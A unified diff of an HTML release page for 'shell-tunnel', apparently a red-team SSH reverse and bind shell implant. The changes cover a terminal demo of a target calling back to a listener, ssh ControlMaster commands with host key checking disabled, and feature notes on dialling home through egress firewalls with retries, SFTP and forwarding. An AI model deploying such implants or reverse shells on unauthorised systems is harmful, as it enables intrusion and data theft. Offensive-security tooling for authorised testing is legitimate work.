@@ -97,9 +97,12 @@
 <span class="ln o">[i] Expecting callback: 10.10.14.5</span>
 <span class="ln" data-step="3"><span class="s">[ok]</span> listening on 0.0.0.0:4444</span>
 <span class="ln o">··· shell-tunnel.exe runs on the target ···</span>
-<span class="ln" data-step="4"><span class="s">[ok]</span> New connection from 10.10.11.23: svc on web01 reachable via 127.0.0.1:4444</span>
+<span class="ln" data-step="4"><span class="s">[ok]</span> Session 1: svc on web01 (from 10.10.11.23), reachable via 127.0.0.1:4444</span>
+<span class="ln o">$ ssh -fNM -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span>
+<span class="ln o">$ ssh -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1</span>
 
-<span class="ln"><span class="p">$</span> <span class="t">ssh -p 4444 svc@127.0.0.1</span></span>
+<span class="ln"><span class="p">$</span> <span class="t">ssh -fNM -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span></span>
+<span class="ln"><span class="p">$</span> <span class="t">ssh -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1</span></span>
 <span class="ln o">svc@127.0.0.1's password:</span>
 <span class="ln" data-step="5"><span class="q">svc@web01:~$</span> <span class="t">id</span></span>
 <span class="ln o">uid=1000(svc) gid=1000(svc) groups=1000(svc),27(sudo)</span>
@@ -107,7 +110,7 @@
 <span class="ln end"><span class="p">$</span> <span class="cursor"></span></span></code></pre>
             </div>
             <figcaption id="session-cap">
-                <p class="cap">A scripted run against a throwaway lab target. The password is baked into the binary at build time and printed by the build script; the callback line is the handler's own output once the target connects, and the <code>ssh</code> session is a stock client — nothing to install on the operator side.</p>
+                <p class="cap">A scripted run against a throwaway lab target. The password is baked into the binary at build time and printed by the build script. The listener numbers each callback and prints two commands: the ControlMaster (run once, then SFTP and forwards share the one authenticated connection) and the interactive session over that socket — stock <code>ssh</code>, nothing to install on the operator side.</p>
                 <button class="replay" type="button" data-replay="screen" hidden>Replay</button>
             </figcaption>
         </figure>
@@ -120,11 +123,11 @@
     <div class="cols">
         <ul class="ck spec">
             <li><span class="ch">Reverse shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>reverse</code></span>
-                <p class="why">The binary dials home through egress firewalls and asks your shell-tunnel listener for a bind port — random by default, pinned with <code>-b</code>. The auto-generated handler script starts the listener, shows the password, and prints the exact <code>ssh</code> command when the callback lands.</p></li>
+                <p class="why">The binary dials home through egress firewalls, retrying every 5 seconds until the listener answers, and keeps the callback warm with SSH keepalives. Your listener asks for a bind port — random by default, pinned with <code>-b</code> — then numbers the session and prints the ControlMaster and connect commands, so <code>sftp</code> and all three forwardings share one authenticated connection. The auto-generated handler script starts the listener and shows the password.</p></li>
             <li><span class="ch">Bind shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>listen</code></span>
                 <p class="why">The binary listens on the target and you SSH straight to it. Same session features as reverse mode, nothing else to run.</p></li>
             <li><span class="ch">Full PTY</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>pty</code></span>
-                <p class="why">openpty on Linux, ConPTY on Windows 10 17763 and later — tab completion, job control and full-screen tools work. Older Windows can fall back to an <code>ssh-shellhost.exe</code> path via <code>-s</code>.</p></li>
+                <p class="why">openpty on Linux, ConPTY on Windows 10 17763 and later — tab completion, job control and full-screen tools work, and terminal resizes follow your window on both platforms. Bash-less targets fall back to <code>/bin/sh</code>; older Windows can use an <code>ssh-shellhost.exe</code> path via <code>-s</code>.</p></li>
             <li><span class="ch">SFTP</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>sftp</code></span>
                 <p class="why">A built-in subsystem on the same connection: <code>sftp -P 4444 svc@127.0.0.1</code> moves files without opening another channel or dropping tools on the target.</p></li>
         </ul>
@@ -147,7 +150,7 @@
     <div class="cols">
         <ul class="ck" aria-label="Checks run">
             <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">In-process integration tests</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
-                <p class="why">16 tests run the real server in-process on loopback and exercise it with a stock SSH client: password and public key authentication (accept and reject), exec with exit status, a PTY shell, an SFTP round trip, direct-tcpip and remote port forwarding, the rs-info channel and the full dial-home reverse flow. They caught a real exit-status race in the original session handler — fixed in this release.</p></li>
+                <p class="why">18 tests run the real server in-process on loopback and exercise it with a stock SSH client: password and public key authentication (accept and reject), exec with exit status, a PTY shell, an SFTP round trip, direct-tcpip and remote port forwarding, the rs-info channel, the full dial-home reverse flow and a late-listener retry; the shell fallback has its own unix-only test. They caught a real exit-status race in the original session handler — fixed in this release.</p></li>
             <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">CI on every commit</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
                 <p class="why">gofmt, <code>go vet</code> and the test suite on ubuntu-24.04, plus a build matrix where ubuntu-24.04, windows-2022 and macos-latest each compile amd64 and arm64 — the six release binaries can never drift from the tree.</p></li>
         </ul>
@@ -164,6 +167,7 @@
     <h2 id="issues-h">Known issues</h2>
     <ul class="plain">
         <li>The dial-home side uses <code>InsecureIgnoreHostKey</code>: a payload can't pin a host key it has never seen. Verify the callback out of band — the handler shows the connecting address and the rs-info line names the user and host.</li>
+        <li>Only the initial dial retries. An established callback that drops later is not redialled; run the payload again.</li>
         <li>TLS wrapping presents a self-signed certificate generated at runtime. It hides the SSH banner from DPI; it does not authenticate the listener to the payload, and payload-to-handler traffic should be treated as resistant to inspection, not to a determined active interceptor.</li>
         <li>Baked credentials live in the binary. Build per engagement, keep handler scripts (which print the password) to yourself — they are written <code>chmod 700</code> for a reason.</li>
         <li>Windows builds before Windows 10 17763 have no ConPTY; interactive PTY there needs <code>-s ssh-shellhost.exe</code>, or append <code>cmd</code> to the ssh line for a non-PTY session.</li>
